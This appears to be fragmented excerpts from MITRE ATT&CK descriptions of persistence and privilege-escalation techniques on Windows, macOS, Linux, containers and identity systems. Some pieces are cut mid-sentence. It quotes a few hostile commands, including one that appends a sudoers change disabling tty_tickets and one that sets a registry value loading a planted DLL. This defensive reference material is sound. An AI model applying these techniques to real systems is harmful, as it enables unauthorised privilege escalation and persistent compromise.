        `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`
        in the PATH environment variable, when \"net\" is executed from the command-line
        the `C:\\example path` will be called instead of the system's legitimate executable
        at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely
        on the PATH environment variable to determine the locations that are searched
        when the path for the program is not given, such as executing programs from
        a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:
        ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify
        the $PATH variable specifying the directories to be searched.  An adversary
        can modify the `$PATH` variable to point to a directory they have write access.
        When a program using the $PATH variable is called, the OS searches the specified
        directory and executes the malicious binary. On macOS, this can also be performed
        through modifying the $HOME variable. These variables can be modified using
        the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),
        or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC

      description: |-
        Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.

        Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)

Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

        If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

        Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

        * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

        Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)

      name: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching'
      description: |-
        Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

        Within Linux and MacOS systems, sudo (sometimes referred to as "superuser do") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments."(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

        The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

        Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

        In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.

      name: 'Hijack Execution Flow: Services Registry Permissions Weakness'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

        Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

        The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

        Adversaries may also add the <code>Parameters</code> key, which can reference malicious drivers file paths. This technique has been identified to be a method of abuse by configuring DLL file paths within the <code>Parameters</code> key of a given services registry configuration. By placing and configuring the <code>Parameters</code> key to reference a malicious DLL, adversaries can ensure that their code is loaded persistently whenever the associated service or library is invoked.

        For example, the registry path(Citation: MDSec) <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters</code>(Citation: hexacorn)(Citation: gendigital) contains the <code>AutodiaDLL</code> value, which specifies the DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code> to point to a hijacked or malicious DLL:

        <code>"AutodialDLL"="c:\temp\foo.dll"</code>

        This ensures persistence, as it causes the DLL (in this case, foo.dll) to be loaded each time the Winsock 2 library is invoked.

        Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.

        Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)

        Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

      name: Domain Trust Modification
      description: "Adversaries may add new domain trusts, modify the properties of
        existing domain trusts, or otherwise change the configuration of trust relationships
        between domains and tenants to evade defenses and/or elevate privileges.Trust
        details, such as whether or not user identities are federated, allow authentication
        and authorization properties to apply between domains or tenants for the purpose
        of accessing shared resources.(Citation: Microsoft - Azure AD Federation)
        These trust objects may include accounts, credentials, and other authentication
        material applied to servers, tokens, and domains.\n\nManipulating these trusts
        may allow an adversary to escalate privileges and/or evade defenses by modifying
        settings to add objects which they control. For example, in Microsoft Active
        Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002)
        without the need to compromise the signing certificate to forge new credentials.
        Instead, an adversary can manipulate domain trusts to add their own signing
        certificate. An adversary may also convert an AD domain to a federated domain
        using Active Directory Federation Services (AD FS), which may enable malicious
        trust modifications such as altering the claim issuance rules to log in any
        valid set of credentials as a specified user.(Citation: AADInternals zure
        AD Federated Domain) \n\nAn adversary may also add a new federated identity
        provider to an identity tenant such as Okta or AWS IAM Identity Center, which
        may enable the adversary to authenticate as any user of the tenant.(Citation:
        Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to
        gain broad access into a variety of cloud-based services that leverage the
        identity tenant. For example, in AWS environments, an adversary that creates
        a new identity provider for an AWS Organization will be able to federate into
        all of the AWS Organization member accounts without creating identities for
        each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)"

        by interacting directly with the Windows API. \n\nAdversaries may also use
        services to install and execute malicious drivers. For example, after dropping
        a driver file (ex: `.sys`) to disk, the payload can be loaded and registered
        via [Native API](https://attack.mitre.org/techniques/T1106) functions such
        as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()`

        [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using

        an adversary may also use a service to escalate privileges. Adversaries may
        also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo

        Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)

        Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL.

        For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)

        The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.

      name: 'Hijack Execution Flow: DLL'
      description: |-
        Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

        Specific ways DLLs are abused by adversaries include:

        ### DLL Sideloading
        Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

        Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

        Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

        Adversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. (Citation: Virus Bulletin) Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. (Citation: Sophos)

        ### DLL Search Order Hijacking
        Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

        ### DLL Redirection
        Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

        ### Phantom DLL Hijacking
        Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

        ### DLL Substitution
        Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

        Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

        Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

        If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.

        how the .NET `AppDomainManager` loads assemblies. The .NET framework uses
        the `AppDomainManager` class to create and manage one or more isolated runtime
        environments (called application domains) inside a process to host the execution
        of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run
        as .NET code) may be loaded into an application domain as executable code.(Citation:
        Microsoft App Domains) \n\nKnown as \"AppDomainManager injection,\" adversaries
        may execute arbitrary code by hijacking how .NET applications load assemblies.
        For example, malware may create a custom application domain inside a target
        process to load and execute an arbitrary assembly. Alternatively, configuration
        files (`.config`) or process environment variables that define .NET runtime
        settings may be tampered with to instruct otherwise benign .NET applications

      description: |-
        Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)

        Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)

      description: "Adversaries may inject malicious code into hijacked processes
        in order to evade process-based defenses as well as possibly elevate privileges.
        Thread Execution Hijacking is a method of executing arbitrary code in the
        address space of a separate live process. \n\nThread Execution Hijacking is
        commonly performed by suspending an existing process then unmapping/hollowing
        its memory, which can then be replaced with malicious code or the path to
        a DLL. A handle to an existing victim process is first created with native
        Windows API calls such as <code>OpenThread</code>. At this point the process
        can be suspended then written to, realigned to the injected code, and resumed
        via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>,
        <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation:
        Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012)
        but targets an existing process rather than creating a process in a suspended
        state.  \n\nRunning code in the context of another process may allow access
        to the process's memory, system/network resources, and possibly elevated privileges.
        Execution via Thread Execution Hijacking may also evade detection from security
        products since the execution is masked under a legitimate process. "

        allows developers to apply fixes to applications (without rewriting code)
        that were created for Windows XP so that it will work with Windows 10. (Citation:
        Elastic Process Injection July 2017)\n\nWithin the framework, shims are created
        to act as a buffer between the program (or more specifically, the Import Address
        Table) and the Windows OS. When a program is executed, the shim cache is referenced
        to determine if the program requires the use of the shim database (.sdb).
        If so, the shim database uses hooking to redirect the code as necessary in
        order to communicate with the OS. \n\nA list of all shims currently installed
        by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>
        and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom
        databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>
        and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo
        keep shims secure, Windows designed them to run in user mode so they cannot
        modify the kernel and you must have administrator privileges to install a
        shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)
        (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data
        Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),
        and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims
        may allow an adversary to perform several malicious acts such as elevate privileges,
        install backdoors, disable defenses like Windows Defender, etc. (Citation:
        FireEye Application Shimming) Shims can also be abused to establish persistence
        by continuously being invoked by affected programs."

      name: Escape to Host
      description: |-
        Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)

        There are multiple ways an adversary may escape from a container to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)

        Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)

        In ESXi environments, an adversary may exploit a vulnerability in order to escape from a virtual machine into the hypervisor.(Citation: Broadcom VMSA-2025-004)

        Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers or virtual machines running on the host, or setting up a command and control channel on the host.

        Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

        Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.

        Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.

        Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.

        The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)

      description: |-
        Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)

        Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)

        Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)

      name: 'Hijack Execution Flow: Path Interception by Search Order Hijacking'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

        Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking, the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

        For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net user</code>. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)

        Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).

      description: "Adversaries may modify Group Policy Objects (GPOs) to subvert
        the intended discretionary access controls for a domain, usually with the
        intention of escalating privileges on the domain. Group policy allows for
        centralized management of user and computer settings in Active Directory (AD).
        GPOs are containers for group policy settings made up of files stored within
        a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation:
        TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike
        other objects in AD, GPOs have access controls associated with them. By default
        all user accounts in the domain have permission to read GPOs. It is possible
        to delegate GPO access control permissions, e.g. write access, to specific
        users or groups in the domain.\n\nMalicious GPO modifications can be used
        to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
        [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001),
        [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create
        Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),
        \ and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide
        to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends
        2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many
        user and machine settings in the AD environment, there are a great number
        of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide
        to GPOs)\n\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code>
        can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)
        by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation:
        Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases
        an adversary might modify specific user rights like SeEnableDelegationPrivilege,
        set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>,
        to achieve a subtle AD backdoor with complete control of the domain because
        the user account under the adversary's control would then be able to modify
        GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)"

      description: |-
        Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

        Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)

        Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)

        Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)

        Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)

        Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)

        Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.

        Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where "command list" will be executed when "signals" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)

      description: |-
        Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from various environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) Each platform's linker uses an extensive list of environment variables at different points in execution. These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions in the original library.(Citation: Baeldung LD_PRELOAD)

        Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. For example, adversaries have used `LD_PRELOAD` to inject a malicious library into every descendant process of the `sshd` daemon, resulting in execution under a legitimate process. When the executing sub-process calls the `execve` function, for example, the malicious library’s `execve` function is executed rather than the system function `execve` contained in the system library on disk. This allows adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564) from detection, as hooking system functions such as `execve` and `readdir` enables malware to scrub its own artifacts from the results of commands such as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation: Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)

        Hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.

      name: Create Process with Token
      description: |-
        Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

        Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.

